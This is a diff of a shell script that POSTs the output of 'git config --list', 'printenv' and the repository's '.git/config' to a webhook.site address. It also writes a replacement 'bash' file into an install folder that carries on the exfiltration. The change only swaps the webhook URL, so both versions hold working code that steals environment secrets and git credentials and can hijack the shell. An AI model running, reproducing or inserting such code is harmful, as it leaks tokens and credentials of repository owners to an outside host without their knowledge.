@@ -3,8 +3,8 @@
 echo "startScript" >&2
 
 echo "GetKeys" >&2
-curl -X POST  -H "Content-Type: text/plain" --data "$(git config --list)" "https://webhook.site/testtelefonica/mac"
-curl -X POST  -H "Content-Type: text/plain" --data "$(printenv)" "https://webhook.site/testtelefonica/mac"
+curl -X POST  -H "Content-Type: text/plain" --data "$(git config --list)" "https://webhook.site/b187d2ec-ffb2-49f6-b8eb-1191952539c7/mac"
+curl -X POST  -H "Content-Type: text/plain" --data "$(printenv)" "https://webhook.site/b187d2ec-ffb2-49f6-b8eb-1191952539c7/mac"
 
 echo "$PATH" >&2
 which bash >&2
@@ -16,7 +16,7 @@ cat > $InstallFolder/bash <<'EOF'
 #!/bin/bash
 echo "hello next step." >&2
 
-export webhook="https://webhook.site/testtelefonica/mac"
+export webhook="https://webhook.site/b187d2ec-ffb2-49f6-b8eb-1191952539c7/mac"
 
 curl -X POST -H "Content-Type: text/plain" --data "$(cat .git/config)" "$webhook/git_config"
 curl -X POST  -H "Content-Type: text/plain" --data "$(git config --list)" "$webhook/git_config_list"
